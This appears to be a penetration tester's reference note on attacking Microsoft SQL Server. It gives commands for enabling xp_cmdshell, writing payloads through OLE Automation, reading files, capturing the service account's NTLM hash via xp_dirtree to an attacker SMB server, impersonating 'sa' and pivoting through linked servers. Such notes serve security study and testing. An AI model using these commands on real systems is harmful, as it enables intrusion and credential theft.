```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
*Microsoft SQL* is a closed-source DBMS initially written for windows (it can run on Linux and MacOS now though). It has strong native support for `.NET`.

*SQL Server Management Studio* (*SSMS*) can be included in the installation of MSSQL. It is a standalone client application that allows for remote configuration of MSSQL.

**Standard Port:** 
- 1433/tcp - default MSSQL server port
- 1434/udp
- 2433/tcp - MSSQL in 'hidden' mode

## How it works
### Authentication Mechanisms
- *Windows authentication mode* : integrates with Windows/Active Directory for its users and groups who are trusted to log in to SQL server. Integrates with the SSO so users don't need to present additional credentials.
- *Mixed mode* : Supports Windows/AD accounts as well as holding its own SQL Server accounts. Usernames and passwords pairs are stored on the SQL server.

## Configuration
### Default Databases
- *master* : system information for an SQL server
- *model* : template database for all new databases created
- *msdb* : SQL server agent uses this database to schedule jobs & alerts
- *tempdb* : stores temporary objects
- *resource* : read-only database containing system objects included with SQL server

Unless configured, the MSSQL service will typically run as `NT SERVICE\MSSQLSERVER`. Connections can be done through Windows Authentication and by default encryption isn't enforced.

## Potential Capabilities
- MSSQL clients might not be using an encrypted connection to the MSSQL server
- Self-signed certificates might allow you to spoof them and make a connection
- Weak or default `sa` credentials. Sometimes it may be forgotten to delete this account.
- System command execution
- Reading/Writing files on disk
### RCE
The extended stored procedures (`xp_cmdshell`) allows us to execute system commands via SQL. It is *disabled by default* but can be enabled using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option). The windows process spawned by `xp_cmdshell` has the same privileges as the SQL Server service account. `xp_cmdshell` operates synchronously.
```sql
1> xp_cmdshell 'whoami'
2> GO

output
-------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If it is disabled, we can change it via `sp_configure`:
```sql
-- To allow advanced options to be changed
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options
RECONFIGURE
GO

-- To enable the feature
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for the featuer
RECONFIGURE
GO
```

> There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

### Writing Files
We can write files with [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, but this could lead to us being able to execute our file through another service.
```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO

sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACReate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<path>', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<payload>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Reading Files
By default, we can read any file on the OS that the account has access to.
```sql
SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents
GO
```

### Stealing the MSSQL Service Account Hash
Using [[Responder]] or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) we can utilise either of the `xp_subdirs` or `xp_dirtree` *undocumented* stored procedures. They utilise SMB to retrieve a list of child directories under a parent dir on the file system. If we point one of these procedures to our SMB server, we can force the SQL Server to authenticate and send the NTLMv2 hash.
```sql
1> EXEC master..xp_dirtree '\\<SMB_SERVER>\share'
2> GO

1> EXEC master..xp_subdirs '\\<SMB_SERVER\share'
2> GO
```

### User Impersonation
The `IMPERSONATE` permission allows you to take on the permissions of another user. This can lead to privilege escalation. Sysadmins can impersonate any user by default but for non-privileged users, permissions must be granted explicitly. To identify users we can impersonate with:
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principles b
ON a.grantor_principle_id = b.principle_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```
We can check our user for sysadmin (a return value of `0` indicates we do NOT have the role, a `1` means we do):
```SQL
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
Impersonating another user is done via:
```sql
EXECUTE AS LOGIN = 'sa'
GO
```
> You should run this in the masterDB as all users have access to this db and will prevent an error - `USE master`

To logout we can use the `REVERT` command.
> It is worth checking all users we can impersonate as some may have access to additional DBs

### Connecting to other DBs
MSSQL has a concept called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). We can perform Transact-SQL statements on other database instances (or even other DB products like oracle). We could use this to move laterally:
```sql
-- We can view any remote servers we have a connection too (0 means its a linked server, 1 means its a remote server)
SELECT srvname, isremote FROM sysservers
GO

-- Identify the user used for the connection
EXECUTE('<remote_command>') AT [<LINKED_SERVER>]
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.10.0.12\SQLEXPRESS]
```

## Enumeration Checklist

| Goal                               | Command(s)                                                                                                                                                                                                                                                                                          | Refs                                                                                                                  |
| ---------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| Nmap script scan                   | sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=[PORT],mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [PORT] [IP] |                                                                                                                       |
| Metasploit scanner for information | scanner/mssql/mssql_ping                                                                                                                                                                                                                                                                            |                                                                                                                       |
| mssqlclient                        | python mssqlclient.py [user]:[pass]@[ip] -windows-auth                                                                                                                                                                                                                                              | [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)                     |
| CLIs                               | $ sqsh -S [IP] -U [user] -P [pass]<br><br>C:\\> sqlcmd -S [IP] -U [user] -P [pass]                                                                                                                                                                                                                  | [sqsh](https://en.wikipedia.org/wiki/Sqsh)<br><br>[sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) |
> If using Windows authentication you must specify a domain or a hostname otherwise it will assume it is SQL Server Authentication.
> Eg. `<SERVER_NAME>\\<ACCOUNT_NAME>` (for local) or `.\\<ACCOUNT_NAME>` (for domain)
### Nmap Scripts
- ms-sql-info
- ms-sql-empty-password
- ms-sql-xp-cmdshell
- ms-sql-config
- ms-sql-ntlm-info
- ms-sql-tables
- ms-sql-hasdbaccess
- ms-sql-dac
- ms-sql-dump-hashes